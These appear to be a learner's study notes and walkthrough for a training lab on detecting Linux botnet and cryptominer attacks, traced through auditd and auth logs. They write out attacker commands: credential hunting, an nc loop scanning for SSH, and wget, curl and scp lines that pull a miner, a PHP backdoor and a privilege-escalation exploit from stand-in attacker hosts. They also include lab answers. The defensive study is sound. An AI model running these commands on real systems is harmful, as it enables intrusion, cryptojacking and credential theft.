  

Discovery 
- When a botnet has breached a Linux system, the first thing an adversary want to know is where they are and how they appeared there.  
    
First Actions 
- The commands that an adversary will run are usually discovery of commands to determine their location within a system. 
    
|   |   |
|---|---|
|Discovery Goal|Typical Commands|
|OS and Filesystem Discovery|pwd, ls /, env, uname -a, lsb_release -a, hostname|
|User and Groups Discovery|id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd|
|Process and Network Discovery|ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat -tnlp|
|Cloud or Sandbox Discovery|systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>"|

1. Run systemd-detect-virt to detect the system’s cloud. What is the command output?  
- We are executing the command above to discover which Cloud was detected.  
    
	![[234.png]] 

2. Run ps aux and look for EDR or antivirus processes. What is the full path to detect antimalware binary?  
- Since this EDR/antivirus is in the binary, we can grep for bin or scan to find the full path  
- Ps aux | grep scan or ps aux | grep bin 
	![[235.png]]
 
	Specialized Discovery  

	- After the initial discovery, the adversary might utilize focus commnads to achieve their goals.  
    
|   |   |
|---|---|
|Attack Objectives|Typical Commands|
|Find and steal credentials and other sensitive data|history \| grep pass, find / -name .env, find /home -name id_rsa|
|Identify how suitable the system is for crypto mining|cat /proc/cpuinfo, lscpu \| grep Model, free -m, top, htop|
|Scan the internal network for other future victims|ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done|

Red Flags  
- Whoami: server spawning whoami 
- find and grep: IT members looking for secrets 
- Ping: A network monitoring tool being used 
    
1. What is the path of the script that initiated the “hostname” command? 
- First we need to use ausearch to find the executed hostname command 
- *ausearch –i –x hostname* 

	![[236.png]] 
- Second, we see a cwd=home/itsupport that is the path of the script that executed the hostname command. 
- Lets use the reverse method of the process tree to determine the script that executed the hostname command starting with the ppid 3771 
- Ausearch –i –pid 3771 
    
	![[237.png]]
- above we see a “debug.sh” script that is the ppid of the 3771 
- We could also follow the path of home/itsupport to determine the script. 

	![[238.png]]
	![[239.png]] 

	Answer: home/itsupport/debug.sh 

2. What was the last Discovery command launched by the script?  
- We already cat the debug.sh, so the answer will be in the results  
	![[240.png]]
	Answer: ps –eo, ppid,cmd,%cpu –sort=-%cp 

3. Looking at the script content, what is the email of the script author?  
	Answer: [greg@tryhackme.thm](mailto:greg@tryhackme.thm) 
	Hack and Forget Attacks  
	- These run at scale and focus on quick gains.  
	- Install Cryptominer: Earn money by using the victim’s CPU/GPU to mine cryptocurrency 
    
	- T1059: Command and Scripting Interpreter ([Command and Scripting Interpreter, Technique T1059 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1059/)) 
		- Tactic: Execution  
			- Adversaries use scripts (powershell, bash, python) to download and execute mining payloads.  
			- Enroll to Botnet: Add the victim to a botnet  
    
	- T1071.001: Application Layer Protocol: Web Protocols ([Application Layer Protocol: Web Protocols, Sub-technique T1071.001 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1071/001/)) 
		- Tactic: Command and Control 
			- The bot checks in via HTTP/HTTPS request to a command-and-control server.  
			- Use Proxy: Use the victim to send phishing, host malware, or route the attacker’s traffic.  
    
	- T1021.001: Remote Services: Remote Desktop Protocol ([Remote Services: Remote Desktop Protocol, Sub-technique T1021.001 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1021/001/)) 
		- Tactic Lateral Movement  
		- Proxies are often used to tunnel RDP sessions into a protected  network from the outside.   
		
	Ingress Tools Transfer 
	- T1105: Ingress Tool Transfer ([Ingress Tool Transfer, Technique T1105 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1105/)) 
	- Tactic: Command and Control  
		- Tools or files that are copied from an external controlled system to the target network through the Command-and-Control channel.  

|   |   |
|---|---|
|Command|Usage Example|
|Wget: Download a file from the website|wget [https://github.com/xmrig/[...]/xmrig-x64.tar.gz](https://github.com/xmrig/[...]/xmrig-x64.tar.gz) -O /tmp/miner.tar.gz|
|Curl: Make a request to the webpage|curl --output /var/www/html/backdoor.php "[https://pastebin.thm/yTg0Ah6a](https://pastebin.thm/yTg0Ah6a)"|
|SSH: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|scp [kali@c2server:/home/kali/cve-2021-4034.sh](mailto:kali@c2server:/home/kali/cve-2021-4034.sh) /tmp/cve-2021-4034.sh|

1. From which domain was the Elastic agent downloaded?  
- We can use one on the command above and grep download 
- *ausearch –i –x wget | grep download* 
	![[241.png]]
	Answer: artifacts.elastic.co 
2. What is the full path to the downloaded “helper.sh” script? 
	- To simplify the search, we can use *ausearch –i | grep helper.sh* 
	- The command above is making the daemons logs into human-readable files and we are greping helper.sh to reduce the amount of information that will be displayed as results. 
    
	![[242.png]]
	Answer: /var/tmp/helper.sh 
	
3. Which of the downloaded files is more likely to be malicious: wget or curl?  
	Answer: curl  
	- “.sh” is more likely to be a script that was downloaded from the website that have malicious intentions 
    

Dota 3 Malware Analysis 

- Is a known crypto-mining botnet that primarily targets Linux systems to hijack resources for mining Monero (XMR).  
    

([Outlaw Cybergang Attacking Targets Worldwide | Community Portal | Gurucul](https://community.gurucul.com/articles/ThreatResearch/Outlaw-Cybergang-Attacking-Targets-6-5-2025)) 

Detecting the Attack 

- Dota 3 remains active becasue many administrators set weak ssh passwords. 
    

|   |   |
|---|---|
|Log Source|Description|
|Auth Logs: cat /var/log/auth.log \| grep "Accepted"|Look for successful SSH logins by password from untrusted, external IP addresses|
|Auditd Process Logs: ausearch -i -x [command]|Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin|

![[243.png]]

1. Which IP address managed to brute-force the exposed SSH?  
	- Even though it is directing us to the audit.logs, we are looking for the authorization of the brute force that breached the system.  
	- Let's go to the directory and see what other files there are.  
    - cd /home/ubuntu/scenario/ 
    
	![[244.png]] 
	- We can see there also a auth.log, we can grep for Accepted login to see which ip address conducted the brute-force attack. 
	- cat auth.log | grep Accepted 
	![[245.png]] Answer: 45.9.148.125
2. Which command did the attacker use to list the last logged-in users?  
	- As I remember from Hack-The-Box challenges, we can use the *last* command to display results of login and logouts of users.  
	- Let use *cat audit.log | grep last* to see if the adversary used that command to list the login users.   
	![[246.png]]
	- we can see there was an execution of usr/bin/last and the comm=”last” is stating that the command “last” was executed.  
	Answer: last  
3. Which three EDR processes did the attacker look for with “egrep” 
	- Some EDR are associated with agent, so let look for an EDR with an agent as its name.  
	- We are already in the directory of /home/ubuntu/scenario, and we see the file audit.log 
	- We can cat audit.log | grep agent to see we grep can detect an agent somewhere in the file 
    ![[247.png]]
	Answer: ds_agent, falcon,sentinel 
4. What is the name of the malicious archive that was transferred via SCP?  
	- Still in the same directory there is a md5 hash value of kernupd. 
	- That may be the name of the malicious file. To be sure, let cat the audit.log and grep for kernupd to see what's the results are. 
    ![[248.png]]
	
5. What is the full command line of the Cryptominer launch? 
	- *Chmod* is to change privileges to an executable  
	- *Nohup*  is a command that is used to run a command that will continue to execute even after a user logs out or closes the terminal.  
	- We can see in the screen above there is a command line that uses nohup following the path of the kernupd executable.  
    
	![[249.png]]
	![[250.png]]
	Answer: nohup /tmp/.apt/kernupd/kernupd 

6. Which Ip address range did the attacker scan for an exposed SSH?  
	- Here I had to filter out alot of noise as I analyze the log.  
	- Starting with cat audit.log | grep nc, there were numerous results that were displayed. 
	- I had comb through to see if there was a nc command associated with an ip address and I found 1 shown below:  
    ![[251.png]]
	 
	- I re-executed the command, but this time, I filtered for a0=”nc” to see if there was more nc executing on other ip addresses.  
	- The results are shown below:  
    
	![[252.png]]
	Answer: 10.10.12.1-10.10.12.10